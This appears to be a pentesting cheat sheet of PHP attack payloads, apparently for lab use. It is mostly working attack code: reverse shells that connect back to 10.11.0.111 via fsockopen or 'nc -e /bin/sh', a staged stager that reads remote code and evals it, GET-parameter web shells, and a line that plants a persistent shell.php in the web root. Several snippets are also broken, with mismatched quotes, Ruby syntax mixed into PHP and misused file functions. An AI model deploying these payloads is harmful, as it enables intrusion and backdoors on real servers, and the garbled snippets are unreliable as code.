#### shells

```<?php echo shell_exec("php -r '$sock=fsockopen("10.11.0.111,6969");exec("/bin/sh -i <&3 >&3 2>&3");'";?>```

```<?php echo shell_exec("sleep 1m;php -r '$sock=fsockopen('10.11.0.111',80).to_i;exec sprintf('/bin/sh -i <&%d >&%d 2>&%d',f,f,f)");?>```

```<?php echo shell_exec("echo <?php echo shell_exec($_GET['cmd']);?> >> /var/www/html/internal/shell.php");?>```

```<?php echo shell_exec("nc -e /bin/sh 127.0.0.1 6969");?>```

```/*<?php /**/ error_reporting(0); $ip = '10.11.0.111'; $port = 4650; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();```

```<?php system($_GET["cmd"]); ?>```

```<?php echo shell_exec("nc -z -v 10.11.0.111 1-443");?>```

-----


#### write file

```
<? php
$txt = "<?php echo shell_exec($_GET['cmd']);?>";
fwrite('shell.php', $txt);
fclose('shell.php');
?>
```

-----


#### scan dir

```
<?php
$filelist = array();
if ($handle = opendir(".")) {
	while ($entry = readdir($handle)) {
		if (strpos($entry, "") === 0) {
			$filelist[] = $entry;
		}
	}
	closedir($handle);
}
?>
```

-----
